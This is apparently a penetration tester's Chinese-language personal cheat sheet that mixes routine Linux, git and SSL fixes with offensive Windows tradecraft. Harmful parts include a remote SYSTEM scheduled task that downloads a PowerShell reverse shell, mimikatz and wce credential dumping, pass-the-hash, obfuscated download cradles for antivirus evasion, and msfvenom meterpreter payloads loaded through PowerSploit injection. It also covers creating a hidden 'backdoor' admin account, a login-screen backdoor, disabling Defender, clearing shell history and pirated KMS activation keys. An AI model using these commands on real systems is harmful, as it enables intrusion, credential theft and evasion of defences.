# Tricks

## 反编译app

### 将apk文件解压
apktool d 文件名.apk
将classes.dex文件翻入dex2jar
通过jd-gui打开jar文件

## Linux配置文件

### 在打开新的shell或使用命令bash打开shell会加载:/etc/bash.bashrc和~/.bashrc文件

### 在Linux系统登录时会加载:/etc/profile和~/.profile文件

## Linux查找文件命令

### which  查看可执行文件的位置。通过环境变量
whereis 查看文件的位置。通过数据库(默认一周更新一次)
locate  配合数据库查看文件位置。通过数据库(默认一周更新一次)
find  实际搜寻硬盘查询文件名称。通过硬盘遍历 find / -name *pass*

## 激活windows10家庭版

### slmgr /ipk TX9XD-98N7V-6WMQ6-BX7FG-H8Q99
slmgr /skms zh.us.to
slmgr /ato
slmgr /xpr

## 激活windows10教育版

### slmgr /ipk NW6C2-QMPVW-D7KKK-3GKT6-VCFB2
slmgr /skms kms.03k.org
slmgr /ato
slmgr /xpr

## pip ssl认证失败

### pip3 install --trusted-host pypi.org --trusted-host files.pythonhosted.org -r requirements.txt

## curl ssl认证失败

### curl -k -O -L https://github.com/pyinstaller/pyinstaller/releases/download/v3.2.1/PyInstaller-3.2.1.zip

## curl ssl_choose_client_version:unsupported protocol报错

### /etc/ssl/openssl.cnf
[default_conf]
ssl_conf = ssl_sect

[ssl_sect]
system_default = system_default_sect

[system_default_sect]
MinProtocol = TLSv1.0
#MinProtocol = TLSv1.2
CipherString = DEFAULT@SECLEVEL=1
#CipherString = DEFAULT@SECLEVEL=2

curl -L -i -k https://113.61.50.59

## wget ssl认证失败

### wget 'https://x.x.x.x/get_ips' --no-check-certificate

## python报错

### UnicodeDecodeError: 'gbk' codec can't decode byte 0xaf in position 849: illegal multibyte sequence

with open(config_file, 'rb') as f:

## pip下载

### pip install -i https://pypi.tuna.tsinghua.edu.cn/simple xxx

### python3.exe -m pip install requests

## gem install ssl认证失败

### ruby -ropenssl -e 'p OpenSSL::X509::DEFAULT_CERT_FILE' that outputs "/usr/local/etc/openssl/cert.pem"
mv /usr/local/etc/openssl/cert.pem /usr/local/etc/openssl/cert.pem.old

## centos配置静态ip及DNS

### 1. ip addr #查看网卡
2. vi /etc/sysconfig/network-scripts/ifcfg-ens33    # ifcfg-ens33是上面看到的网卡名称
3. 修改
BOOTPROTO=static
ONBOOT=yes
4. 添加静态ip、默认网关、DNS
IPADDR=192.168.1.111
NETMASK=255.255.255.0
GATEWAY=192.168.1.1
DNS1=114.114.114.114
5. 重启网卡
systemctl restart network

## 常用操作

### 计划任务

- schtasks /create /S TARGET /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.1:8080/Invoke-PowerShellTcp.ps1''')'"
schtasks /Run /S TARGET /TN "STCheck" (运行已创建的计划任务)
参数说明:
/S TATGET to specify the remote servers
/SC Weekly to set the interval of when the task should be executed
/RU the user the remote task is going to run as
/TN the name of the task
/TR the command to execute

### 命令执行

- psexec.exe -accepteula \\TARGET cmd.exe

### PTH

- secretsdump.py -hashes LM:NTLM ./Administrator@TARGET

### UAC settings

- Seatbelt.exe UACSystemPolicies

### User Right Assignment (URA)

- https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment

### 抓Windows密码

- mimikatz

	- privilege::debug
sekurlsa::logonpasswords

- getpass.exe
- wce

	- 获取hash值: wce.exe -o output.txt
	- 获取明文: wce.exe  -w
	- PTH: wce.exe -s <username>:<domain>:<lmhash>:<nthash> -c <program>

## Linux导入根证书

### openssl x509 -inform der -in QiAnXin\ Enterprise\ Security\ SSL\ CA.cer -out QiAnXin\ Enterprise\ Security\ SSL\ CA.crt
mkdir /usr/share/ca-certificates/extra
cp QiAnXin\ Enterprise\ Security\ SSL\ CA.crt /usr/share/ca-certificates/extra/QAX.crt

dpkg-reconfigure ca-certificates
或
/etc/ca-certificates.conf
添加一行extra/foo.crt
update-ca-certificates

reboot

## git下载问题

### git config --global http.proxy http://proxy.lfk.360es.cn:3128
git config --global http.sslVerify false

## git拉取更新仓库

### git clone https://github.com/Scotoma8/Minimalistic-offensive-security-tools
cd Minimalistic-offensive-security-tools\
git remote add source https://github.com/InfosecMatter/Minimalistic-offensive-security-tools
git remote -v
git fetch source
git branch -av
git checkout master
git merge source/master
git commit -am 'update'
git push origin

## git repo自动更新

### https://codeload.github.com/earwig/git-repo-updater/zip/v0.5.1
python3.exe setup.py install
#git remote add source https://github.com/InfosecMatter/Minimalistic-offensive-security-tools
#git remote -v
git clone https://github.com/chompie1337/SMBGhost_RCE_PoC
gitup .

## kali虚拟机扩容

### 1./bin/sh /usr/lib/udisks2/udisks2-inhibit /usr/sbin/gpartedbin
2.依次删除 linux-swap项， extended项， 最后剩下sda1和未分配， 然后右键”sda1”项进行调整大小， 将磁盘容量调整到合适的大小并预留2G作交换区
3.再右键”未分配”进行逻辑分区， 再格式化出linux-swap， 最后点击打钩提交生效
4.重启 df -h查看是否生效

## windows卸载补丁

### wusa.exe /uninstall /kb:4523202

## windows 10禁止更新

### services.msc Windows Update Logon Type disabled recovery take no action 9999

## windows 10关闭defender

### 1.gpedit.msc 管理模板 windows组件 防病毒程序 关闭windows防病毒程序enable
2.regedit.msc 计算机\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SecurityHealthService Start值设为4

## ubuntu安装msf

### curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
apt install postgresql
msfdb init

## ubuntu安装ssh

### vim /etc/apt/sources.list
deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse
deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse
deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse

dpkg -l | grep ssh
apt-get install openssh-client
apt-get install openssh-server
aptitude install openssh-server
/etc/init.d/ssh start
service sshd start

以 root 用户通过 ssh 登录
vim /etc/ssh/sshd_config
PermitRootLogin yes
service ssh restart
systemctl enable ssh

## ubuntu ssh免密登陆

### A:
ssh-keygen -t rsa -P ''
scp id_rsa.pub root@x.x.x.x:/root/.ssh/authorized_keys

B:
mkdir /root/.ssh
chmod 700 .ssh/
chmod 600 authorized_keys

## IIS ASP搭建

### 1.添加角色
2.勾选应用程序开发
3.完成IIS安装
4.打开IIS管理器
5.选择网站default web site
6.基本设置中改为Classic.NETAppPool
7.给文件夹C:\Windows\ServiceProfiles\NetworkService\AppData\Local\Temp添加Authenticated Users用户完全控制
8.在default web site上选择ASP并将行为中启用父路径设置为true

## https代理服务器搭建

### apt-get install apache2-utils -y
apt-get install squid3 -y
apt-get install stunnel4 -y
htpasswd -c /etc/squid/squid.passwd scotoma8
vim /etc/squid/squid.conf
http_port 127.0.0.1:3128
auth_param basic program /usr/lib/squid3/basic_ncsa_auth /etc/squid/squid.passwd
auth_param basic children 5
auth_param basic realm Squid proxy-caching web server
auth_param basic credentialsttl 2 hours
auth_param basic casesensitive off
acl ncsa_users proxy_auth REQUIRED
http_access deny !ncsa_users
http_access allow ncsa_users
/etc/init.d/squid restart
cat chasers.fun.key chasers.fun.pem >> /etc/stunnel/stunnel.pem
vim /etc/stunnel/stunnel.conf
client = no
[squid]
accept = 4128
connect = 127.0.0.1:3128
cert = /etc/stunnel/stunnel.pem
vim /etc/default/stunnel4
ENABLED=1
/etc/init.d/stunnel4 restart

客户端
浏览器:https www.chasers.fun 4128 username password
linux shell:export https_proxy=https://username:password@www.chasers.fun:4128

## nginx开启访问认证

### 1.apt-get install apache2-utils
2.mkdir -p /usr/local/src/nginx/
3.htpasswd -c /usr/local/src/nginx/passwd username
4.cat /usr/local/src/nginx/passwd
5.vim nginx.conf
auth_basic "Please input password"; #验证时提示信息
auth_basic_user_file /usr/local/src/nginx/passwd;
6./etc/init.d/nginx restart
7.htpasswd命令选项参数说明
     -c 创建一个加密文件
     -n 不更新加密文件，只将htpasswd命令加密后的用户名密码显示在屏幕上
     -m 默认htpassswd命令采用MD5算法对密码进行加密
     -d htpassswd命令采用CRYPT算法对密码进行加密
     -p htpassswd命令不对密码进行进行加密，即明文密码
     -s htpassswd命令采用SHA算法对密码进行加密
     -b htpassswd命令行中一并输入用户名和密码而不是根据提示输入密码
     -D 删除指定的用户
	htpasswd -bc passwd user pass
	htpasswd -b passwd user pass
	htpasswd -nb user pass
	htpasswd -D passwd user

## 科学上网vps搭建

### v2ray
server:
bash <(curl -sL https://raw.githubusercontent.com/hijkpw/scripts/master/ubuntu_install_v2ray.sh)
bash <(curl -L -s https://install.direct/go.sh)
 v2ray运行状态：正在运行
 v2ray配置文件：/etc/v2ray/config.json
v2ray配置信息：               
 IP(address):  18.223.135.1x3
 端口(port)：x6xx
 id(uuid)：xx143a79-xx2a-4685-b4x3-d0a281xxxcc7
 额外id(alterid)： 62
 加密方式(security)： auto
 传输协议(network)： tcp
client:
windows:https://github.com/2dust/v2rayN/releases
android:https://github.com/2dust/v2rayNG/releases

shadowsocks
server:
wget -N --no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssr.sh && chmod +x ssr.sh && bash ssr.sh
client:
http://shadowsocks.org/en/download/clients.html

## docker加速镜像

### vim /etc/docker/daemon.json
{
    "registry-mirrors": [
        "https://1nj0zren.mirror.aliyuncs.com",
        "https://docker.mirrors.ustc.edu.cn",
        "http://f1361db2.m.daocloud.io",
        "https://registry.docker-cn.com"
    ]
}
systemctl daemon-reload
systemctl restart docker

## kali安装docker

### apt-get update
apt-get install -y apt-transport-https ca-certificates
apt-get install dirmngr
apt-key adv --keyserver hkp://p80.pool.sks-keyservers.net:80 --recv-keys 58118E89F3A912897C070ADBF76221572C52609D
echo 'deb https://apt.dockerproject.org/repo debian-stretch main' > /etc/apt/sources.list.d/docker.list
apt-get update
apt-get install docker-engine
service docker start

## msfvenom命令自动补全

### oh-my-zsh:
apt-get install zsh -y
sh -c "$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)"
msfvenom plugin:
git clone https://github.com/Green-m/msfvenom-zsh-completion ~/.oh-my-zsh/custom/plugins/msfvenom/
vim ~/.zshrc
plugins=(git msfvenom)
fpath=(~/.zsh/completion $fpath)
autoload -Uz compinit && compinit -i
source ~/.zshrc

## cmd命令混淆

### File copy
cmd /c copy powershell.exe benign.exe
File deletion
cmd /c del benign.exe
File creation	
cmd /c “echo LINE1 > bad.vbs&&echo LINE2 >> bad.vbs”
File read	
cmd /c type HOSTS
File modification	
cmd /c “echo 127.0.0.1 www.baidu.com >> HOSTS”
File listing	
cmd /c dir “C:\Program Files*”
Directory creation	
cmd /c mkdir %PUBLIC%\Recon
Symbolic link creation	
cmd /c mklink ClickMe C:\Users\Public\evil.exe

利用大小写与特殊字符进行混淆
1.转义字符“^”
2.逗号和分号 
cmd /c " ; ,  whoami"
3.圆括号
cmd /c "((whoami) && (whoami))"
4.双引号
"w"h"o"ami

利用环境变量进行混淆
ComSpec=C:\Windows\system32\cmd.exe
%VarName:~offset[,length]%
echo %comspec:~20,7%
cmd /c "set var1=ser&& set var2=ne&& set var3=t u&&call echo %var2%%var3%%var1%"
net user
cmd /V:ON /C "set var1=ser&& set var2=ne&& set var3=t u&& call echo !var2!!var3!!var1!"
net user

利用文件名扩展关联命令
assoc [.ext[=[fileType]]]
assoc .txt 
.txt=txtfile
ftype [fileType[=[openCommandString]]
ftype txtfile
txtfile=%SystemRoot%\system32\NOTEPAD.EXE %1

利用For循环拼接命令
FOR /L %variable IN (start,step,end) DO command [command-parameters]
FOR /F ["options"] %variable IN ("string") DO command [command-parameters]
for /f "delims=f= tokens=2" %f IN ( 'assoc .cmd' ) do %f
.cmd=cmdfile
cmd

CMD命令混淆工具:
https://github.com/danielbohannon/Invoke-DOSfuscation
Import-Module .\Invoke-DOSfuscation.psd1
Invoke-DOSfuscation
混淆分三个等级

检测手段:
1.静态检测
https://github.com/We5ter/Flerken
跨平台，不仅能检测CMD的混淆，还能检测 shell,powershell等命令混淆方式。静态检测的方式，对于动态生成+微混淆 的命令检测能力较弱。
2.AI
https://www.fireeye.com/blog/threat-research/2018/11/obfuscated-command-line-detection-using-machine-learning.html
3.语义分析
https://ddvvmmzz.github.io/Windows-CMD%E5%91%BD%E4%BB%A4%E5%8E%BB%E6%B7%B7%E6%B7%86
4.沙箱执行
https://github.com/fireeye/flare-qdb/blob/master/doc/dedosfuscator.md

## kali安装proxychains-ng

### sudo apt-get install git gcc
sudo apt-get remove proxychains
git clone https://github.com/rofl0r/proxychains-ng.git
cd proxychains-ng/
./configure --prefix=/usr --sysconfdir=/etc
make
sudo make install
sudo make install-config

## cmd及powershell下查看已登录的qq

### cmd

- dir \\.\pipe\\ | findstr "QQ_" | findstr "_pipe"

### powershell

- [System.Text.RegularExpressions.Regex]::Matches([System.IO.Directory]::GetFiles("\\.\\pipe\\"),"QQ_(\d*)_pipe").Groups;

## 端口转发

### socat -d TCP4-LISTEN:3344,reuseaddr,fork TCP4:10.95.14.216:9999

### nc

- 服务端端口转发到其他机器端口
192.168.6.146:
nc -lvp 55
listening on [any] 55 ...
192.168.6.128: inverse host lookup failed: Unknown host
connect to [192.168.6.146] from (UNKNOWN) [192.168.6.128] 43134

192.168.6.128:
mkfifo backpipe
nc -l -p 45 0< backpipe | nc 192.168.6.146 55 | tee backpipe

访问者:
nc 192.168.6.128 45
与192.168.6.146:55端口建立连接
访问者发的数据不显示在192.168.6.128:45上，直接传到192.168.6.146:55上
192.168.6.146发送的数据会同时显示在192.168.6.128:45和访问者上
- 服务端本地端口转发
192.168.6.128:
mkfifo backpipe
nc -l -p 45 0< backpipe | nc 127.0.0.1 55 | tee backpipe
nc -lvp 55
listening on [any] 55 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 47242

192.168.6.146:
nc 192.168.6.128 45
- 客户端1通过代理连接客户端2
192.168.6.128:
mkfifo backpipe
nc clientip1 45 0< backpipe | nc 192.168.6.146 55 | tee backpipe

clientip1:
nc -lvp 45

192.168.6.146:
nc -lvp 55
listening on [any] 55 ...
192.168.6.128: inverse host lookup failed: Unknown host
connect to [192.168.6.146] from (UNKNOWN) [clientip1] 43136

## Linux删除命令记录

### history -c 清除所有历史记录

### vim ~/.bash_history 修改历史记录存储文件
history -r 读取历史文件到内存

## cs启动

### nohup ./teamserver 1.2.3.4 password &

### java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -Xms512M -Xmx1024M -jar cobaltstrike.jar

## kali中文乱码

### dpkg-reconfigure locales
en_US.UTF-8 UTF-8和zh_CN.UTF-8 UTF-8
apt-get install xfonts-intl-chinese
apt-get install ttf-wqy-microhei
kali-undercover

## kali配置静态ip及DNS

### vim /etc/network/interfaces
auto eth0
iface eth0 inet static
address xxx.xxx.xxx.xxx
netmask xxx.xxx.xxx.xxx
gateway xxx.xxx.xxx.xxx

vim /etc/resolv.conf 临时修改dns

apt-get install resolvconf 永久修改dns
vim /etc/resolvconf/resolv.conf.d/base
nameserver 114.114.114.114
update-rc.d resolvconf enable
reboot

## ubuntu设置root界面登录

### vim /usr/share/lightdm/lightdm.conf.d/50-ubuntu.conf
greeter-show-manual-login=true

vim /root/.profile
tty -s && mesg n || true

vim /etc/gdm3/custom.conf
[security]
AllowRoot=true

vim /etc/pam.d/gdm-password
注释此行 auth required pam_succeed_if.so user != root quiet_success

## Windows特殊文件名(系统设备名)

### 文件名末尾加空格或.

- echo 1 > "\\?\e:\Cool!\q.txt    "
echo 1 > "\\?\e:\Cool!\q.txt."

## Windows特殊文件名

### 系统设备名

- com1/aux等无法被用于文件名
echo hello >\\.\C:\Users\user1\Downloads\aux.txt (\\?\亦可) 无法手动删除
type \\.\C:\Users\user1\Downloads\aux.txt(\\?\亦可)
del \\.\C:\Users\user1\Downloads\aux.txt(可删除)
del \\.\C:\Users\user1\Downloads\a...\aux.txt(无法删除)
rd /s /q \\.\C:\Users\user1\Downloads\a...\(可删除)

echo 1 > "\\?\e:\Cool!\aux.txt"
echo 1 > "\\?\e:\Cool!\aux.txt   "
echo 1 > "\\?\e:\Cool!\aux.txt."

## Windows畸形目录

### md a..\ 手动无法删除
rd /s /q a..\命令行可删

## Windows后门

### 1.具有本地管理员权限、文件所有者及完全控制权限
2.修改待替换的文件名
3.将cmd.exe拷贝出后更改为待替换文件名(无需条件1)
4.将cmd.exe复制到待替换文件的目录(需本地管理员权限)
5.重启在登录界面时运行后门程序
6.获得系统权限的shell(nt authority\system)

## Powershell技巧

### | 管道符的作用是将一个命令的输出作为另一个命令的输入
; 分号用来连续执行系统命令
＆是调用操作符，它允许你执行命令，脚本或函数
双引号可以替换内部变量
双引号里的双引号，单引号里的单引号，写两遍输出

Get-Alias -name dir 查看别名
Get-ExecutionPolicy 查看当前执行策略
Set-ExecutionPolicy 设置执行的策略
Get-Host 查看powershell版本
Get-Content 查看文件内容
Get-Content test.txt  显示文本内容
Set-Content test.txt-Value “hello,word” 设置文本内容
Get-Process  查看当前服务列表
Get-Location 获取当前位置
Get-WmiObject -Class Win32_ComputerSystem |Select-object -ExpandProperty UserName 查看登录到物理机的用户

powershell有六种执行策略:
Unrestricted  权限最高，可以不受限制执行任意脚本
Restricted  默认策略，不允许任意脚本的执行
AllSigned  所有脚本必须经过签名运行
RemoteSigned  本地脚本无限制，但是对来自网络的脚本必须经过签名
Bypass   没有任何限制和提示
Undefined  没有设置脚本的策略
默认情况下，禁止脚本执行。除非管理员更改执行策略。Set-ExecutionPolicy

绕过执行策略执行:
powershell Get-Content 1.ps1 | powershell -NoProfile -
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://xxx.xxx.xxx/a.ps1')"
powershell -ExecutionPolicy bypass -File ./a.ps1
powershell -ExecutionPolicy unrestricted -File ./a.ps1

Invoke-Expression(IEX的别名):用来把字符串当作命令执行。
WindowStyle Hidden(-w Hidden):隐藏窗口
Nonlnteractive(-NonI):非交互模式，PowerShell不为用户提供交互的提示。
NoProfile(-NoP):PowerShell控制台不加载当前用户的配置文件。
Noexit(-Noe):执行后不退出Shell。
EncodedCommand(-enc): 接受base64 encode的字符串编码，避免一些解析问题

Bypass AV:
powershell.exe "$v1='powershell -c IEX';$v2='(New-Object Net.WebClient).Downlo';$v3='adString(''http://x.x.x.x/x.ps1'')';IEX ($v1+$v2+$v3)"
powershell.exe "$v1='powershell -c IEX';$v2='(New-Object Net.WebClient).Downlo';$v3='666(''http://x.x.x.x/x.ps1'')'.replace('666','adString');IEX ($v1+$v2+$v3)"
powershell.exe "$v1='powershell -c IEX';$v2='(New-Object Net.WebClient).DownloadString(''ht';$v3='tp://x.x.x.x/x.ps1'')';IEX ($v1+$v2+$v3)"

混淆框架:
https://github.com/danielbohannon/Invoke-Obfuscation
图片免杀执行powershell:
https://github.com/peewpw/Invoke-PSImage

PowerSploit脚本加载shellcode:
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=x.x.x.x LPORT=4444 -f powershell -o /var/www/html/test
IEX(New-Object Net.WebClient).DownloadString("http://x.x.x.x/PowerSploit/CodeExecution/Invoke-Shellcode.ps1")
IEX(New-Object Net.WebClient).DownloadString("http://x.x.x.x/test")
Invoke-Shellcode -Shellcode $buf -Force

PowerSploit脚本加载dll:
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=x.x.x.x lport=4444 -f dll -o /var/www/html/test.dll
IEX(New-Object Net.WebClient).DownloadString("http://x.x.x.x/PowerSploit/CodeExecution/Invoke-DllInjection.ps1")
Start-Process c:\windows\system32\notepad.exe -WindowStyle Hidden
Invoke-DllInjection -ProcessID xxx -Dll c:\test.dll

PowerSploit脚本加载exe:
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=x.x.x.x lport=4444 -f exe > /var/www/html/test.exe
powershell.exe -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1');Invoke-ReflectivePEInjection -PEUrl http://x.x.x.x/test.exe -ForceASLR"

检查计算机是否属于域:
(Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain

获取工作组名称:
(Get-WmiObject -Class Win32_ComputerSystem).Workgroup

检查系统是32位还是64位:
[System.Environment]::Is64BitOperatingSystem
(Get-CimInstance -ClassName win32_operatingsystem).OSArchitecture

已安装软件列表:
Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\Software | ft Name

已安装补丁列表:
Get-HotFix

已安装powershell版本列表:
(gp HKLM:\SOFTWARE\Microsoft\PowerShell\*\PowerShellEngine -Name PowerShellVersion).PowerShellVersion
$PSVersionTable

获取系统正常运行时间:
[Timespan]::FromMilliseconds([Environment]::TickCount)

进程信息:
ps
tasklist /svc 

终止进程:
Stop-Process -Id <PID>
kill -Force <PID>
Get-Process <name> | Stop-Process
ps notepad | kill -Force

隐藏/不隐藏文件或目录:
(get-item test.txt).Attributes += 'Hidden'
(get-item test.txt -force).Attributes -= 'Hidden'

列出隐藏文件:
gci -Force

删除文件或目录:
rm -force <path>
rm -recurse -force <dir>

获取文件校验和:
Get-FileHash -Algorithm MD5 file.txt

获取/设置ACL信息:
Get-Acl c:\windows\system32 | ft -wrap
Get-Acl HKLM:\SYSTEM\CurrentControlSet\Services | fl
Get-Acl \source\location | Set-Acl \destination\location

列出/读取/创建注册表子项/值:
ls HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion | select name
gp "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
New-Item "HKCU:\software" -Name "test key"
Remove-Item "HKCU:\software\test key" -recurse
New-ItemProperty HKCU:\Software -name "test value" -value 123
Remove-ItemProperty HKCU:\Software -name "test value"

服务信息:
Get-Service
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-Service | Where-Object {$_.Status -eq "Stopped"}
Start-Service <name>
Stop-Service <name>

当前运行身份:
[Security.Principal.WindowsIdentity]::GetCurrent() | select name

本地用户:
Get-LocalUser | ft Name,Enabled,LastLogon

本地管理员:
Get-LocalGroupMember Administrators

创建本地管理员账户:
New-LocalUser "backdoor" -Password (ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force)
Add-LocalGroupMember -Group "Administrators" -Member "backdoor"
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "backdoor"

获取ip地址:
Get-NetIPAddress
Get-NetIPConfiguration

获取ARP表:
Get-NetNeighbor

获取路由表:
Get-NetRoute

获取网络连接列表:
Get-NetTCPConnection
-RemotePort 443
-LocalPort 443
-State listen
Get-NetUDPEndpoint -verbose

端口开放探测:
Test-NetConnection -ComputerName 192.168.6.128 -Port 22
New-Object System.Net.Sockets.TCPClient -ArgumentList 192.168.6.128,22(不进行ping)
脚本(单ip):
$ports = "21 22 23 25 53 80 88 111 139 389 443 445 873 1099 1433 1521 1723 2049 2100 2121 3299 3306 3389 3632 4369 5038 5060 5432 5555 5900 5985 6000 6379 6667 8000 8080 8443 9200 27017"
$ip = "192.168.204.190"
$ports.split(" ") | % {echo ((new-object Net.Sockets.TcpClient).Connect($ip,$_)) "Port $_ is open on $ip"} 2>$null
脚本(C段):
$port = 445
$net = "10.10.0."
0..255 | foreach { echo ((new-object Net.Sockets.TcpClient).Connect($net+$_,$port)) "Port $port is open on $net$_"} 2>$null

DNS配置查询:
Get-DnsClientServerAddress

域名解析查询(A记录):
Resolve-DNSname google.com
[System.Net.Dns]::Resolve('google.com').AddressList.IPAddressToString

DNS反向查询:
Resolve-DNSname 8.8.8.8
[System.Net.Dns]::Resolve('8.8.8.8').hostname
脚本:
$net = "10.10.0."
0..255 | foreach {Resolve-DNSname -ErrorAction SilentlyContinue $net$_ | ft NameHost -HideTableHeaders} | Out-String -Stream | where {$_ -ne ""} | tee hostnames.txt

枚举本地SMB / CIFS网络共享
Get-WmiObject -class Win32_Share
Get-CimInstance -Class Win32_Share
Get-SmbShare

枚举远程SMB / CIFS网络共享
Get-WmiObject -class Win32_Share -ComputerName <IP|hostname>
Invoke-Command -ComputerName 'IP|hostname' -ScriptBlock {Get-SmbShare}

访问远程SMB / CIFS网络驱动器
Push-Location \192.168.204.190\drive
# In the end disconnect from the network drive:
Pop-Location

$n = New-Object -ComObject "Wscript.Network"
$n.MapNetworkDrive("x:", "\192.168.204.190\Public")
x:
# In the end remove the network share:
$n.RemoveNetworkDrive("x:")

New-PSDrive -name mydrive -PSProvider FileSystem -root "\192.168.204.190\Public"
mydrive:
# In the end remove the network share:
Remove-PSDrive mydrive

New-SmbMapping -LocalPath x: -RemotePath \192.168.204.190\Public
x:
# In the end remove the network drive:
Remove-SmbMapping -LocalPath x: -force

$n = New-Object -ComObject "Wscript.Network"
$n.MapNetworkDrive("x:", "\192.168.204.190\data", $true, 'domain\username', 'password')
x:
# In the end remove the network share:
$n.RemoveNetworkDrive("x:")

列出当前映射的网络驱动器:
(New-Object -ComObject WScript.Network).EnumNetworkDrives()

下载文件:
(New-Object System.Net.WebClient).DownloadFile("http://192.168.204.190/a.exe","c:\test\a.exe")
Invoke-RestMethod -Uri "http://192.168.204.190/file.exe" -OutFile "file.exe"
Invoke-WebRequest -Uri "http://192.168.204.190/a.exe" -OutFile "C:\test\a.exe"
wget -Uri "http://192.168.204.190/a.exe" -OutFile "C:\test\a.exe"
curl -Uri "http://192.168.204.190/a.exe" -OutFile "C:\test\a.exe"
iwr -Uri "http://192.168.204.190/a.exe" -OutFile "C:\test\a.exe"
Import-Module BitsTransfer
Start-BitsTransfer -source "http://192.168.204.190/a.exe" -destination "a.exe"

上传文件:
(New-Object System.Net.WebClient).UploadFile("http://192.168.204.190/", "POST", "c:\test\file.zip");
wget -Uri "http://192.168.204.190/" -InFile "C:\test\file.zip" -Method Put
Invoke-RestMethod -Uri "http://192.168.204.190/" -Method Put -InFile "C:\test\file.zip"

获取防火墙策略:
Get-NetFirewallProfile | select name,enabled
cd HKLM:HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy
gp *Profile | select PSChildName,EnableFirewall

获取防火墙规则列表:
Show-NetFirewallRule

启用/禁用防火墙:
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
Set-NetFirewallProfile -Profile Domain,Public,Private -Disabled True

允许rdp:
# Allow RDP connections
(Get-WmiObject -Class "Win32_TerminalServiceSetting" -Namespace root\cimv2\terminalservices).SetAllowTsConnections(1)
# Disable NLA
(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
# Allow RDP on the firewall
Get-NetFirewallRule -DisplayGroup "Remote Desktop" | Set-NetFirewallRule -Enabled True

加ip到白名单:
New-NetFirewallRule -Action Allow -DisplayName "myrule" -RemoteAddress 192.168.204.190
# Afterwards, remove the rule:
Remove-NetFirewallRule -DisplayName "myrule"

列出代理设置:
gp "Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"

发邮件:
Send-MailMessage -SmtpServer <smtp-server> -To joe@example.com -From sender@example.com -Subject "subject" -Body "message" -Attachment c:\path\to\attachment

获取当前AD域:
([adsisearcher]"").Searchroot.path
[System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain().Forest.Name

获取域控列表:
[System.DirectoryServices.ActiveDirectory.Domain]::GetComputerDomain().DomainControllers | select IPAddress
Resolve-DNSName -type srv _ldap._tcp.example.com
Resolve-DNSName -type srv _kerberos._tcp.example.com

获取域用户:
$a = [adsisearcher]”(&(objectCategory=person)(objectClass=user))”
$a.PropertiesToLoad.add(“samaccountname”) | out-null
$a.PageSize = 1
$a.FindAll() | % { echo $_.properties.samaccountname } > users.txt

$s = New-Object System.DirectoryServices.DirectorySearcher([adsi]"LDAP://dc=domain,dc=com","(&(objectCategory=person)(objectClass=user))")
$s.FindOne()
$s = New-Object System.DirectoryServices.DirectorySearcher([adsi]"LDAP://dc=domain,dc=com","(&(objectCategory=person)(objectClass=user))")
$s.PropertiesToLoad.add(“samaccountname”) | out-null
$s.PageSize = 1
$s.FindAll() | % { echo $_.properties.samaccountname } > users.txt

$a = New-Object adsisearcher((New-Object adsi("LDAP://domain.com","domain\username","password")),"(&(objectCategory=person)(objectClass=user))")
$a.FindOne()
$a = New-Object adsisearcher((New-Object adsi("LDAP://domain.com","domain\username","password")),"(&(objectCategory=person)(objectClass=user))")
$a.PropertiesToLoad.add(“samaccountname”) | out-null
$a.PageSize = 1
$a.FindAll() | % { echo $_.properties.samaccountname } > users.txt

获取域内计算机:
$a = [adsisearcher]”(objectCategory=computer)”
$a.PropertiesToLoad.add(“dnshostname”) | out-null
$a.PageSize = 1
$a.FindAll() | % { echo $_.properties.dnshostname } > computers.txt

获取域密码策略:
([adsisearcher]"").Searchroot.minPwdLength
([adsisearcher]"").Searchroot.lockoutThreshold
([adsisearcher]"").Searchroot.lockoutDuration
([adsisearcher]"").Searchroot.lockoutObservationWindow
([adsisearcher]"").Searchroot.pwdHistoryLength
([adsisearcher]"").Searchroot.minPwdAge
